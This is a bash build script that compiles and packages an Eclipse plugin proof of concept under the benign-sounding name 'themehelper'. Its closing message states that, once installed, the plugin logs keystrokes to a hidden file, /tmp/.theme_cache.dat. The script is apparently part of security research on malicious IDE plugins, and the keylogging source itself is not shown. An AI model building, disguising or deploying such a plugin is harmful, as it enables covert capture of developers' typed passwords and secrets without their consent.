#!/bin/bash
# Build the Eclipse PoC plugin
# Usage: ./build.sh [path_to_osgi_jar]
#
# The OSGi framework JAR is needed for compilation. (bundled with eclipse in my testing)
#
set -Eeuo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/build"
SRC_DIR="$SCRIPT_DIR/src"
JAR_NAME="com.linnemanlabs.themehelper_1.0.0.jar"

# Find OSGi JAR
OSGI_JAR="${1:-}"

if [[ -z "$OSGI_JAR" ]]; then
    echo "[*] Searching for OSGi framework JAR..."
    OSGI_JAR=$(find /var/lib/flatpak /app/eclipse -name 'org.eclipse.osgi_*.jar' -o -name 'org.osgi.framework_*.jar' 2>/dev/null | head -1 || true)
    if [[ -z "$OSGI_JAR" ]]; then
        echo "[-] Could not find OSGi JAR. Pass it as an argument:"
        echo "    $0 /path/to/org.osgi.framework.jar"
        exit 1
    fi
    echo "[+] Found: $OSGI_JAR"
fi

# Find javac
JAVAC="$(command -v javac 2>/dev/null || true)"
if [[ -z "$JAVAC" ]]; then
    echo "[*] javac not in PATH, searching..."
    JAVAC=$(find /app /usr/lib/jvm /usr/local -name 'javac' -type f 2>/dev/null | head -1 || true)
fi
if [[ -z "$JAVAC" ]]; then
    echo "[-] javac not found. Install a JDK (e.g., dnf install java-17-openjdk-devel)"
    exit 1
fi
echo "[+] Using javac: $JAVAC"

# Clean and create build dir
rm -rf "$BUILD_DIR"
mkdir -p "$BUILD_DIR"

# Compile
echo "[*] Compiling..."
"${JAVAC}" -source 17 -target 17 -cp "$OSGI_JAR" -d "$BUILD_DIR" "$SRC_DIR/com/linnemanlabs/poc/Activator.java"

# Copy manifest
mkdir -p "$BUILD_DIR/META-INF"
cp "$SCRIPT_DIR/META-INF/MANIFEST.MF" "$BUILD_DIR/META-INF/"

# Package JAR
echo "[*] Packaging..."
cd "$BUILD_DIR"
"$(dirname "${JAVAC}")/jar" cfm "$SCRIPT_DIR/$JAR_NAME" META-INF/MANIFEST.MF com/

echo "[+] Built: $JAR_NAME"
echo ""
echo "Install in Eclipse, keystrokes logged to /tmp/.theme_cache.dat"
echo ""
